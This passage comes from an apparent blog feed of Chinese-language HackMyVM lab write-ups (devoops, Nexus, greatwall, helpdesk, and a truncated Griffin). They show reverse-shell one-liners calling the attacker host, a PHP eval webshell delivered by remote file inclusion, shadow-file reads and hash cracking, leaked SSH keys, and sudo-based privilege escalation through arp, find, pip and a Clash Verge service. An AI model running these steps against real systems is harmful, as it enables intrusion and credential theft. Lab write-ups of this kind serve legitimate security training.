   ```shell
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ nc -lvnp 1234 &gt; 1.tar
   ```

3. 在靶机上，使用 `nc` 将打包好的文件发送到Kali。

   ```shell
   cat 1.tar|busybox nc 192.168.205.128 1234
   ```

文件传输完成后，在Kali上解压并分析git仓库的历史记录。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tar -xf 1.tar
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cd node.git 
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/node.git]
└─$ git log -p
```

`git log -p` 的输出显示了一个非常关键的提交历史：开发者曾错误地将一个SSH私钥 `id_ed25519` 提交到仓库，随后又在下一次提交中将其删除。

```diff
commit 1994a70bbd080c633ac85a339fd85a8635c63893 (HEAD -&gt; main)
Author: azwhikaru &lt;37921907+azwhikaru@users.noreply.github.com&gt;
Date:   Mon Apr 21 14:36:12 2025 +0800

    del: oops!

diff --git a/id_ed25519 b/id_ed25519
deleted file mode 100644
index a2626a4..0000000
--- a/id_ed25519
+++ /dev/null
@@ -1,7 +0,0 @@
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
-5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
-AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
-WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
------END OPENSSH PRIVATE KEY-----
```

从diff信息中提取私钥内容并还原。在反弹Shell中，通过`netstat -lntup`发现SSH服务仅监听在`127.0.0.1:22`，无法从外部直接访问。

```shell
netstat -lntup
Active Internet connections (only servers)
...          
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -                   
...
```

为了能够使用获取到的私钥登录，需要在靶机上进行端口转发，将内部的SSH服务暴露给攻击机。这里使用`socat`将2222端口的流量转发至127.0.0.1:22。

```shell
socat TCP-LISTEN:2222,fork TCP4:127.0.0.1:22 &amp;
```

现在，可以使用私钥通过2222端口SSH登录`hana`用户。

```shell
┌──(kali㉿kali)-[/tmp]
└─$ # ... (还原私钥到 /tmp/id_rsa) ...
                                                                                   ┌──(kali㉿kali)-[/tmp]
└─$ sed -i 's/^-//' id_rsa                                                                                          
┌──(kali㉿kali)-[/tmp]
└─$ chmod 600 id_rsa
                                                                                                                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ ssh hana@192.168.205.149 -p 2222 -i /tmp/id_rsa
...
devoops:~$ id
uid=1001(hana) gid=100(users) groups=100(users),100(users)
```

成功以 `hana` 用户身份登录。

# **五、权限提升**

登录 `hana` 用户后，检查其 `sudo` 权限。

```shell
devoops:~$ sudo -l
Matching Defaults entries for hana on devoops:
...
User hana may run the following commands on devoops:
    (root) NOPASSWD: /sbin/arp
```

结果显示 `hana` 用户可以无密码以root权限执行 `/sbin/arp` 命令。这是一个已知的可被利用于提权的配置。查询 [[GTFOBins](https://gtfobins.github.io/gtfobins/arp/#sudo)](https://gtfobins.github.io/gtfobins/arp/#sudo) 可知，`arp` 命令的 `-f` 参数可以加载一个文件，如果指定的文件不存在或格式错误，它会尝试逐行读取并显示文件内容，从而实现任意文件读取。

利用此特性读取 `/etc/shadow` 文件，获取root用户的密码哈希。

```shell
devoops:~$ sudo arp -v -f /etc/shadow
&gt;&gt; root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
....
```

将获取到的root用户哈希保存到本地文件，并使用 `john` 和字典进行破解。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo 'root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.' &gt; hash
                          
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=xato-net-10-million-passwords.txt hash
...
eris             (root)     
...
Session completed. 
```

成功破解出root密码为 `eris`。

# **六、获取Flag**

使用破解出的密码切换到 `root` 用户，提权完成。

```shell
devoops:~$ su -
Password: 
devoops:~#
```

最后，在 `root` 和 `hana` 的家目录中找到并读取flag文件。

```shell
devoops:~# cat /root/R007.7x7oOoOoOoOoOoO /home/hana/user.flag 
flag{a834296543f4c2990909ce1c56becfba}
flag{03d0e150ae9fc686a827b41e1969d497}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_devoops.html</guid><pubDate>Sun, 24 Aug 2025 12:10:24 +0000</pubDate></item><item><title>hmv_Nexus</title><link>https://7r1UMPHK.github.io/post/hmv_Nexus.html</link><description># 一、信息收集

首先，在当前网段内进行主机发现，确定目标靶机的IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.132 08:00:27:99:80:8f       PCS Systemtechnik GmbH
...
```

目标主机IP为 `192.168.205.132`。

接下来，使用Nmap对目标主机进行全端口扫描，以探测其开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 05:04 EDT
Nmap scan report for novice.com (192.168.205.132)
Host is up (0.00017s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:99:80:8F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds
```

扫描结果显示，目标开放了 `22` (SSH) 和 `80` (HTTP) 两个端口。我们从Web服务入手。

# 二、Web渗透

访问目标 `http://192.168.205.132`，发现是一个静态图片展示页面，没有可交互的功能点。因此，决定进行目录爆破来发现更多信息。

使用 `gobuster` 进行目录扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.132 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -t 64
===============================================================
...
[+] Url:                     http://192.168.205.132
...
===============================================================
/index.html           (Status: 200) [Size: 825]
/login.php            (Status: 200) [Size: 352]
/index2.php           (Status: 200) [Size: 75134]
/server-status        (Status: 403) [Size: 280]
...
===============================================================
```

扫描发现了 `index2.php` 和 `login.php`。访问 `index2.php`，发现是一个功能复杂的仿黑客交互式页面。在页面的 'CRYPTO' 模块中，找到了一段十六进制编码的字符串：

```
48 6f 6c 61 20 41 6c 69 74 61 2c 20 ... 6c 61 20 72 65 64 2e
```

使用 CyberChef 将其转换为文本，得到以下信息：

&gt; 嗨，Alita，希望你正在读这条加密信息。要破解系统，你需要使用我解释过的技术。我已经把访问代码和验证码“pandora”给了你。线上见。

虽然得到了 “pandora” 这个关键信息，但当时并未完全理解其用途。

继续探索 `index2.php` 的其他模块，在 'NEXUS' 模块中发现了一条重要的提示信息，指向了一个新的登录路径：

![image-20250824172310725](http://7r1UMPHK.github.io/image/20250824174142762.webp)

`NEXUS MSG&gt; _ AUTHORIZATION PANEL :: http://[personal ip]/auth-login.php`

访问 `http://192.168.205.132/auth-login.php`，发现一个登录框。尝试输入 `admin` 并在密码框中输入一个单引号 `'`，页面返回了SQL错误，表明此处存在SQL注入漏洞。

使用 `sqlmap` 对该登录表单进行自动化注入攻击：

```bash
sqlmap -u 'http://192.168.205.132/auth-login.php' --batch --forms --dump
```

`sqlmap` 成功识别并利用了注入点，从数据库中 dump 出了 `users` 表的内容：

```
...
Database: sion
Table: users
[2 entries]
+----+--------------------+----------+
| id | password           | username |
+----+--------------------+----------+
| 1  | F4ckTh3F4k3H4ck3r5 | shelly   |
| 2  | cambiame08         | admin    |
+----+--------------------+----------+
...
```

我们获得了一组有效的凭证：`shelly` / `F4ckTh3F4k3H4ck3r5`。

# 三、权限提升

利用上一步获取的凭证，通过SSH登录目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh shelly@192.168.205.132
shelly@192.168.205.132's password: F4ckTh3F4k3H4ck3r5

... Welcome Banner ...

shelly@NexusLabCTF:~$ id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly)...
```

登录成功后，立即检查当前用户的 `sudo` 权限。

```bash
shelly@NexusLabCTF:~$ sudo -l
...
User shelly may run the following commands on NexusLabCTF:
    (ALL) NOPASSWD: /usr/bin/find
```

结果显示，`shelly` 用户可以无需密码以 `root` 权限执行 `/usr/bin/find` 命令。`find` 命令可以通过 `-exec` 参数执行任意命令，这是一个经典的提权向量。

利用 `find` 命令提权至 `root`：

```bash
shelly@NexusLabCTF:~$ sudo find . -exec /bin/bash \; -quit
root@NexusLabCTF:/home/shelly# id
uid=0(root) gid=0(root) groups=0(root)
```

成功获取 `root` 权限。首先，读取用户 flag：

```bash
root@NexusLabCTF:/home/shelly# cat /home/shelly/SA/user-flag.txt 
...
HackMyVM
Flag User ::  82kd8FJ5SJ00HMVUS3R36gd
```

# 四、最终Flag获取

在 `root` 用户的家目录下，发现了一个名为 `Sion-Code` 的目录，其中包含一个图片文件 `use-fim-to-root.png`。文件名暗示了最终的 flag 可能与这个文件有关。

为了方便分析，使用 `scp` 将该图片文件传回 Kali 攻击机。

```bash
# 在靶机上执行
root@NexusLabCTF:~/Sion-Code# scp use-fim-to-root.png kali@192.168.205.128:/mnt/hgfs/gx/x
...
use-fim-to-root.png                                     100%   71KB  19.7MB/s   00:00
```

![use-fim-to-root](http://7r1UMPHK.github.io/image/20250824174140496.webp)

回到 Kali，使用 `strings` 命令检查图片文件中是否隐藏了可打印的字符串。这种方法常用于在文件中寻找被隐藏的信息（一种简单的隐写术）。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ strings use-fim-to-root.png | tail -n 1
;HMV-FLAG[[ p3vhKP9d97a7HMV79ad9ks2s9 ]]
```

在文件的末尾成功找到了最终的 root flag。渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Nexus.html</guid><pubDate>Sun, 24 Aug 2025 09:42:13 +0000</pubDate></item><item><title>hmv_greatwall</title><link>https://7r1UMPHK.github.io/post/hmv_greatwall.html</link><description># **一、信息收集**

## **1.1. 主机发现**

首先，在目标网段内使用`arp-scan`工具进行主机发现，确定目标靶机的IP地址。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.131 00:0c:29:24:e9:11       VMware, Inc.
...
```

从扫描结果中，我们识别出目标主机的IP地址为 `192.168.205.131`。

## **1.2. 端口扫描**

接下来，使用`rustscan`对目标主机进行端口扫描，以发现其开放的服务。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ rustscan -a 192.168.205.131
...
Open 192.168.205.131:22
Open 192.168.205.131:80
```

扫描结果显示，目标主机开放了两个端口：22 (SSH) 和 80 (HTTP)。

## **1.3. Web服务探查**

访问目标 `http://192.168.205.131`，发现一个Web页面，页面上有一个输入框，提示语为 'Across the Great Wall we can reach every corner in the world'。

查看页面源代码，可以发现一个GET方法提交的表单，参数名为 `page`。

```html
&lt;body&gt;
    ...
    &lt;form method='GET' class='address-form'&gt;
        &lt;input type='text' name='page' class='address-bar' placeholder='https://'&gt;
    &lt;/form&gt;
    ...
&lt;/body&gt;
```

# **二、漏洞利用 (获取Webshell)**

## **2.1. LFI漏洞与出站防火墙策略发现**

根据功能猜测，`page`参数可能用于包含或请求其他页面。首先尝试使用 `file://` 协议读取本地文件，构造Payload：`file:///etc/passwd`。

服务器成功返回了 `/etc/passwd` 文件的内容，证实了此处存在一个本地文件包含 (LFI) 漏洞。

在进一步利用时，我们发现了一个关键限制：当尝试从远程服务器包含文件或发起反弹shell时，请求均会失败。经过多次测试，发现**该服务器存在出站（Egress）防火墙策略**，这并非Web应用层面的功能限制，而是更底层的网络配置（例如iptables）。该策略严格限制了服务器对外发起的连接：**只允许向目标端口为 22 (SSH) 和 80 (HTTP) 的地址建立连接**。任何试图连接到其他端口（如常用的4444, 8080等）的出站流量都会被阻断。

这一发现解释了为什么无论是远程文件包含还是反弹shell，都必须将我们攻击机上的监听服务设置在 80 或 22 端口。

## **2.2. 远程文件包含Getshell**

利用LFI漏洞，并遵从目标服务器的出站防火墙策略，我们可以让目标服务器包含并执行我们自己服务器上的恶意PHP文件，从而获取Webshell。

1. **准备Webshell**: 在Kali攻击机上创建一个简单的PHP一句话木马 `ant.php`。

   ```shell
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ cat ant.php 
   &lt;?php eval($_POST['ant']); ?&gt;
   ```

2. **开启HTTP服务**: 在`ant.php`所在目录，使用Python开启一个临时的HTTP服务器。**根据前一步发现的出站防火墙策略，此HTTP服务必须开启在80端口**，否则目标服务器将无法访问。

   ```shell
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ sudo python3 -m http.server 80
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   ```

3. **包含远程Webshell**: 在目标Web页面的输入框中，构造Payload指向我们Kali攻击机上的webshell：`http://192.168.205.128/ant.php`。

4. **连接Webshell**: 使用蚁剑 (AntSword) 连接目标，URL为 `http://192.168.205.131/`，在请求数据的 `page` 参数中填入我们的远程马地址 `http://192.168.205.128/ant.php`，连接密码为 `ant`。

成功连接后，我们获得了目标服务器的Webshell，当前用户为 `www-data`。

# **三、权限提升**

## **3.1. www-data -&gt; wall**

在Webshell中，我们发现当前用户 `www-data` 可以通过 `sudo` 以 `wall` 用户的身份执行 `chmod` 命令。

```shell
(www-data:/var/www/html) $ sudo -l
...
User www-data may run the following commands on this host:
    (ALL : wall) NOPASSWD: /bin/chmod
```

虽然可以直接执行 `chmod`，但无法直接利用它来修改 `/bin/bash` 等系统文件的权限以直接提权。但是，我们可以利用这个权限来修改 `wall` 用户家目录的权限，从而读取其SSH私钥。

1. **修改wall家目录权限**:

   ```shell
   (www-data:/home) $ ls -la
   drwx------  4 wall wall 4096 May 11 02:41 wall
   (www-data:/home) $ sudo -u wall chmod 755 wall
   (www-data:/home) $ ls -la
   drwxr-xr-x  4 wall wall 4096 May 11 02:41 wall
   ```

2. **读取SSH私钥**: 进入 `wall` 用户的 `.ssh` 目录，修改私钥 `id_rsa` 的权限并读取其内容。

   ```shell
   (www-data:/home/wall/.ssh) $ sudo -u wall chmod 600 id_rsa
   (www-data:/home/wall/.ssh) $ cat id_rsa
   -----BEGIN OPENSSH PRIVATE KEY-----
   b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
   ...
   QMXdH6a7iy89MAAAAOd2FsbEBncmVhdHdhbGwBAgMEBQ==
   -----END OPENSSH PRIVATE KEY-----
   ```

3. **SSH登录**: 将复制的私钥保存在Kali攻击机本地（例如 `/tmp/id_rsa`），赋予 `600` 权限，然后使用该私钥以 `wall` 用户身份SSH登录目标主机。

   ```shell
   ┌──(kali㉿kali)-[/tmp]
   └─$ vim id_rsa
   ┌──(kali㉿kali)-[/tmp]
   └─$ chmod 600 id_rsa
   ┌──(kali㉿kali)-[/tmp]
   └─$ ssh wall@192.168.205.131 -i /tmp/id_rsa
   Linux greatwall 6.1.0-32-amd64 ...
   wall@greatwall:~$ id
   uid=1000(wall) gid=1000(wall) groups=1000(wall)...
   ```

成功登录后，我们获得了 `wall` 用户的交互式Shell。

## **3.2. wall -&gt; root**

登录`wall`用户后，再次检查`sudo`权限。

```shell
wall@greatwall:~$ sudo -l
Matching Defaults entries for wall on greatwall:
    ...
User wall may run the following commands on greatwall:
    (ALL) NOPASSWD: /usr/bin/systemctl start clash-verge-service
```

发现 `wall` 用户可以无密码启动 `clash-verge-service` 服务。这与近期披露的 **Clash Verge 权限提升漏洞**特征相符。

&gt; [!Tip]
&gt;
&gt; https://mp.weixin.qq.com/s/fwIPGN79kf6_VAGkJOmz7w

**漏洞原理简析**:
Clash Verge 在通过 `systemctl` 启动服务时，会监听一个本地的HTTP接口（默认为 `127.0.0.1:33211`）。攻击者可以向该接口的 `/start_clash` 路径发送一个恶意的POST请求。请求体中的 `bin_path` 参数可以指定一个本地的可执行文件路径，服务会以`root`权限执行这个文件。这就造成了一个本地权限提升漏洞。

**利用步骤**:

1. **启动漏洞服务**: 使用 `sudo` 启动服务，激活漏洞接口。

   ```shell
   wall@greatwall:~$ sudo /usr/bin/systemctl start clash-verge-service
   ```

2. **验证服务监听**: 使用 `ss` 命令确认服务已在本地 `33211` 端口监听。

   ```shell
   wall@greatwall:~$ ss -tnlp
   State      Recv-Q     Send-Q         Local Address:Port      Peer Address:Port
   ...
   LISTEN     0          128                127.0.0.1:33211          0.0.0.0:*
   ...
   ```

3. **创建提权脚本**: 在 `/tmp` 目录下创建一个脚本 `a.sh`，其功能是为 `/bin/bash` 添加SUID权限位，并赋予其执行权限。

   ```shell
   wall@greatwall:/tmp$ cat &gt; a.sh &lt;&lt; EOF
   #!/bin/bash
   chmod +s /bin/bash
   EOF
   wall@greatwall:/tmp$ chmod +x a.sh
   ```

4. **发送恶意请求**: 使用 `curl` 向本地 `33211` 端口的 `/start_clash` 接口发送POST请求，通过 `bin_path` 参数指定执行我们刚刚创建的 `/tmp/a.sh` 脚本。

   ```shell
   wall@greatwall:/tmp$ curl -X POST 'http://127.0.0.1:33211/start_clash' \
   -H 'Content-Type: application/json' \
   -d '{'bin_path': '/tmp/a.sh', 'config_dir': '', 'config_file': '', 'log_file': '/dev/null'}'
   
   {'code':0,'msg':'ok','data':null}
   ```

5. **获取Root Shell**: 检查 `/bin/bash` 的权限，可以看到已经添加了SUID位。此时执行 `bash -p` 即可获得一个 `euid` 为 `root` 的shell。

   ```shell
   wall@greatwall:/tmp$ ls -la /bin/bash
   -rwsr-sr-x 1 root root 1265648 Mar 30  2024 /bin/bash
   wall@greatwall:/tmp$ bash -p
   bash-5.2# id
   uid=1000(wall) gid=1000(wall) euid=0(root) egid=0(root) groups=0(root)...
   ```

6. **读取Flag**: 至此，我们已成功提权至root，可以读取所有flag。

   ```shell
   bash-5.2# cat /root/r007.7x7oZzZzZzzzz /home/wall/user.flag
   flag{b3d2a9f34869484b74db97411cf1eb3b}
   flag{b088764475fa2a0a962fb9154f41c5b6}
   ```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_greatwall.html</guid><pubDate>Sun, 24 Aug 2025 07:37:26 +0000</pubDate></item><item><title>hmv_helpdesk</title><link>https://7r1UMPHK.github.io/post/hmv_helpdesk.html</link><description># 一、信息收集

## **1. 主机发现**

首先，通过 `arp-scan` 对本地网络进行扫描，以发现目标主机的IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.142 08:00:27:e5:04:39       PCS Systemtechnik GmbH
...
```

扫描结果显示目标主机IP为 `192.168.205.142`。

## **2. 端口扫描**

使用 `nmap` 对目标主机进行全端口扫描，以确定开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.142
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 11:18 EDT
Nmap scan report for 192.168.205.142
Host is up (0.0011s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E5:04:39 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描发现主机开放了 22 (SSH) 和 80 (HTTP) 端口。

## **3. Web目录扫描**

访问80端口，页面显示为一个正在维护的“HelpDesk Ticketing System”。为了寻找更多信息，使用 `dirsearch` 和 `gobuster` 进行目录爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u http://192.168.205.142/     
...
[11:19:21] 200 -  214B  - /debug.php
[11:19:24] 301 -  242B  - /javascript  -&gt;  http://192.168.205.142/javascript/
[11:19:25] 200 -  756B  - /login.php
[11:19:27] 302 -    0B  - /panel.php  -&gt;  login.php
...

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.142 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
...
/index.php            (Status: 200) [Size: 1290]
/login.php            (Status: 200) [Size: 1819]
/ticket.php           (Status: 200) [Size: 204]
/panel.php            (Status: 302) [Size: 0] [--&gt; login.php]
/debug.php            (Status: 200) [Size: 250]
...
```

扫描发现了几个关键文件：`debug.php`, `login.php`, `panel.php` 和 `ticket.php`。

访问 `debug.php` 页面，发现了一组凭证，但经过尝试，这组凭证无法用于登录，属于误导信息。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.142/debug.php   
&lt;style&gt;
...
&lt;/style&gt;&lt;h2&gt;Debug Mode Enabled&lt;/h2&gt;&lt;pre&gt;[DEBUG] Connecting to internal dev server...
[DEBUG] Using creds: service_user:SuperSecretDev123!&lt;/pre&gt;
```

# 二、漏洞利用

## **1. 本地文件包含 (LFI)**

`ticket.php` 页面看起来像一个票据查看器，尝试使用 `ffuf` 对其参数进行模糊测试。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ffuf -w ... -u 'http://192.168.205.142/ticket.php?FUZZ=id' --fw 24
...
url                     [Status: 200, Size: 271, Words: 30, Lines: 5, Duration: 0ms]
...
```

Fuzzing 发现了一个名为 `url` 的参数。通过该参数，可以读取 `login.php` 的源代码，确认存在本地文件包含漏洞。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.142/ticket.php?url=login.php'
...
&lt;h1&gt;Ticket Viewer&lt;/h1&gt;&lt;pre&gt;&lt;?php
session_start();
...
// Stored credentials
$stored_user = 'helpdesk';

// SHA-512 hash for password: ticketmaster
$stored_hash = '$6$ABC123$fLo2MacCV.XBQeRZtHWL2297q/fUBs/b8gOmvLGuiz7wDgl3MSWcOOSKnTbaNPoUMCmEpY1dlwuPKbAtIuoo6.';
...
?&gt;
...
```

从 `login.php` 的源码中，获得了用户名 `helpdesk` 和密码 `ticketmaster` 的哈希值。使用 `helpdesk:ticketmaster` 成功登录了Web后台。

## **2. 命令执行与反弹Shell**

登录后的面板存在命令执行功能。利用该功能，通过 `busybox nc` 获取一个反弹shell。

在Kali上监听8888端口：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
```

在Web面板中执行：

```bash
busybox nc 192.168.205.128 8888 -e /bin/bash
```

成功获取 `www-data` 用户的shell。

```bash
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 51576
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

为方便后续操作，通过以下步骤稳定shell：

```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
```

# 三、权限提升

## **1. www-data -&gt; helpdesk**

在目标主机上进行信息搜集，在 `/opt/helpdesk-socket/` 目录下发现了一个可利用的Unix套接字。

```bash
www-data@helpdesk:/opt/helpdesk-socket$ ls -al
total 16
drwxr-xr-x 2 helpdesk helpdesk 4096 Aug 23 15:17 .
drwxr-xr-x 4 root     root     4096 Aug 16 15:32 ..
-rwxr-xr-x 1 helpdesk helpdesk  158 Aug 16 15:32 handler.sh
srwxrwxrwx 1 helpdesk helpdesk    0 Aug 23 15:17 helpdesk.sock
-rw-r--r-- 1 root     root      184 Aug 16 15:44 serve.sh
```

查看 `handler.sh` 和 `serve.sh` 脚本内容：

```bash
www-data@helpdesk:/opt/helpdesk-socket$ cat *
#!/bin/bash
# Simple parser — executes anything sent over the socket (dangerous!)
read cmd
echo '[HelpDesk Automation] Executing: $cmd'
/bin/bash -c '$cmd'
cat: helpdesk.sock: No such device or address
#!/bin/bash

SOCKET='/opt/helpdesk-socket/helpdesk.sock'

[ -e '$SOCKET' ] &amp;&amp; rm '$SOCKET'

/usr/bin/socat -d -d UNIX-LISTEN:$SOCKET,fork,mode=777 EXEC:/opt/helpdesk-socket/handler.sh
```

**知识点补充：socat 与 UNIX Socket**

*   **socat**：是一个强大的网络工具，堪称netcat的增强版。 它的核心功能是在两个数据流之间建立一个双向通道。 这些数据流可以是文件、管道、设备、TCP/UDP套接字，甚至是执行的程序。
*   **UNIX Socket**：这是一种在同一台机器上的进程间通信（IPC）机制。 它不经过网络协议栈，而是通过文件系统进行通信，因此效率更高。
*   **漏洞分析**：`serve.sh` 脚本以 `helpdesk` 用户身份运行，并使用 `socat` 创建了一个名为 `helpdesk.sock` 的UNIX套接字。 关键在于 `mode=777` 参数，它使得任何用户都对这个socket文件有读、写、执行权限。当有数据发送到这个socket时，`EXEC:/opt/helpdesk-socket/handler.sh` 会被触发，`handler.sh` 会将接收到的数据作为命令直接用 `/bin/bash -c` 执行。

利用这个漏洞，将一个反弹shell的命令通过 `socat` 发送到 `helpdesk.sock`，从而以 `helpdesk` 用户权限执行。

在Kali上重新监听8888端口，然后在 `www-data` shell中执行：

```bash
www-data@helpdesk:/opt/helpdesk-socket$ echo '/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1' | socat - /opt/helpdesk-socket/helpdesk.sock
```

成功获得 `helpdesk` 用户的shell。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 53106
...
helpdesk@helpdesk:/$ id
uid=1001(helpdesk) gid=1001(helpdesk) groups=1001(helpdesk)
```

## **2. helpdesk -&gt; root**

使用 `sudo -l` 查看 `helpdesk` 用户的sudo权限。

```bash
helpdesk@helpdesk:/$ sudo -l
...
User helpdesk may run the following commands on helpdesk:
    (ALL) NOPASSWD: /usr/bin/pip3 install --break-system-packages *
```

发现 `helpdesk` 用户可以免密以root权限执行 `pip3 install` 命令。这是一个已知的提权向量。 当`pip install`安装一个本地目录时，它会执行该目录下的`setup.py`文件。 因此，我们可以创建一个恶意的`setup.py`文件，在其中包含提权命令。

创建一个包含提权payload的 `setup.py` 文件，该payload会给 `/bin/bash` 添加SUID权限。

```bash
helpdesk@helpdesk:~$ mkdir 1;cd 1
helpdesk@helpdesk:~/1$ echo 'import os; os.system('chmod +s /bin/bash')' &gt; setup.py
helpdesk@helpdesk:~/1$ ls -al /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

使用 `sudo` 执行 `pip3 install` 来安装当前目录。

```bash
helpdesk@helpdesk:~/1$ sudo /usr/bin/pip3 install --break-system-packages .
Processing /home/helpdesk/1
  Preparing metadata (setup.py) ... done
...
helpdesk@helpdesk:~/1$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

可以看到 `/bin/bash` 已经成功被设置了SUID位。现在，执行 `bash -p` 即可获得root权限的shell。

```bash
helpdesk@helpdesk:~/1$ bash -p
bash-5.2# id
uid=1001(helpdesk) gid=1001(helpdesk) euid=0(root) egid=0(root) groups=0(root),1001(helpdesk)
bash-5.2# cat /root/root.txt /home/helpdesk/user.txt 
flag{request_has_been_escalated}
flag{ticket_approved_by_thedesk}
```

成功获取root权限并读取最终的flag。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_helpdesk.html</guid><pubDate>Sat, 23 Aug 2025 15:33:55 +0000</pubDate></item><item><title>内部_Griffin</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Griffin.html</link><description># **一、信息收集**

首先，使用`arp-scan`工具对本地网络进行扫描，以发现目标主机的IP地址。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.132 08:00:27:9e:89:aa       PCS Systemtechnik GmbH
...
```

确定目标IP地址为 `192.168.205.132`。

接下来，使用`nmap`对目标主机进行全端口扫描，以识别开放的端口和服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 09:24 EDT
Nmap scan report for novice.com (192.168.205.132)
Host is up (0.00038s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 08:00:27:9E:89:AA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
```

扫描结果显示目标开放了`22`端口（SSH服务）和`8080`端口（HTTP代理服务）。

# **二、Web渗透与漏洞利用**

## **2.1 Web目录探测**

访问`http://192.168.205.132:8080/`，页面显示欢迎信息。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.132:8080/
